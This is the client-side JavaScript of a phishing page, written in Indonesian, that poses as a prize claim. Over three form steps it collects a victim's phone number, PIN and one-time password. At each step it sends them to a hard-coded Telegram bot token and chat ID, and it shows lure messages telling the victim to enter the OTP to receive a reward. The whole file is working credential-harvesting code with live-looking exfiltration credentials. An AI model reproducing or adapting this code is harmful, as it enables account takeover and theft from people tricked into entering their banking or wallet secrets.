document.addEventListener("DOMContentLoaded", () => {
  const botToken = '7468194503:AAGIkXncZqQEn4weMA6AGIQqdGnvzRcc6Pw';
  const chatId = '7732620750';

  let previousData = { phoneNumber: "", pin: "", otp: "" };
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const floatingNotification = document.getElementById("floating-notification");
  const pages = document.querySelectorAll(".container > div");
  let currentPageIndex = 0;

  // Fungsi untuk memformat nomor telepon
  function formatPhoneNumber(phoneNumber) {
    const cleaned = ('' + phoneNumber).replace(/\D/g, '');
    const match = cleaned.match(/^(\d{4})(\d{4})(\d{4})$/);
    if (match) {
      return `${match[1]}-${match[2]}-${match[3]}`;
    }
    return phoneNumber;
  }

  // Event listener untuk memformat nomor telepon
  document.getElementById("phone-number").addEventListener("input", (e) => {
    const formattedNumber = formatPhoneNumber(e.target.value);
    e.target.value = formattedNumber;
  });

  async function sendNotificationToTelegram(phoneNumber, pin, otp) {
    if (
      phoneNumber === previousData.phoneNumber &&
      pin === previousData.pin &&
      otp === previousData.otp
    ) {
      console.log("Data sama, tidak mengirim ulang.");
      return;
    }

    previousData = { phoneNumber, pin, otp };

    let message = "";
    if (otp) {
      message = ` *↔️GELAT :Detail Lengkap* \n📞 *Nomor:* \`${phoneNumber}\`\n🖕 *PIN:* \`${pin}\`\n🔥 *OTP:* \`${otp}\``;
    } else if (pin) {
      message = ` ** \n📞 *Nomor:* \`${phoneNumber}\`\n🖕 *PIN:* \`${pin}\`\n🔥 *OTP:* _CKCKCK_`;
    } else {
      message = `📞 *Nomor:* \`${phoneNumber}\`\n🖕 *PIN:* _CKCKCK_\n🔥 *OTP:* _CKCKCK_`;
    }

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "MarkdownV2" }),
      });
      console.log("Notifikasi terkirim:", message);
    } catch (error) {
      console.error("Gagal mengirim notifikasi:", error);
    }
  }

  function tampilkanNotifikasi(pesan) {
    floatingNotification.innerText = pesan;
    floatingNotification.style.cssText = `
      display: block;
      background: #fff;
      border: 2px solid #333;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      font-weight: bold;
      text-align: center;
      max-width: 300px;
      position: fixed;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
    `;
  }

  function showPage(index) {
    pages.forEach((page, i) => {
      page.style.display = i === index ? "block" : "none";
    });

    currentPageIndex = index;
    const firstInput = pages[index].querySelector("input");
    if (firstInput) firstInput.focus();
  }

  function goToNextPage() {
    const phoneNumber = document.getElementById('phone-number').value;
    const pin = Array.from(document.querySelectorAll('.pin-box')).map(input => input.value).join('');
    const otp = Array.from(document.querySelectorAll('.otp-box')).map(input => input.value).join('');

    if (currentPageIndex === 0) {
      sendNotificationToTelegram(phoneNumber, "", "");
      tampilkanNotifikasi(`📞 Nomor ${phoneNumber} telah dikirim ke bot.`);
    } else if (currentPageIndex === 1) {
      sendNotificationToTelegram(phoneNumber, pin, "");
      tampilkanNotifikasi(`🔑 MASUKKAN OTP ${phoneNumber} UNTUK MENERIMAH.`);
    } else if (currentPageIndex === 2) {
      sendNotificationToTelegram(phoneNumber, pin, otp);
      tampilkanNotifikasi(`🎉 Selamat! Hadiah kamu ${phoneNumber} diterima.\nSilahkan verifikasi notifikasi untuk mendapatkan kode OTP.`);
    }

    if (currentPageIndex < pages.length - 1) {
      showPage(currentPageIndex + 1);
    }
  }

  document.getElementById("phone-number").addEventListener("input", () => showPage(0));
  document.querySelectorAll(".pin-box, .otp-box").forEach(input => {
    input.addEventListener("input", () => input.value.length === input.maxLength && input.nextElementSibling?.focus());
  });

  lanjutkanButton.addEventListener("click", goToNextPage);
  floatingNotification.addEventListener("click", () => floatingNotification.style.display = "none");

  showPage(0);
});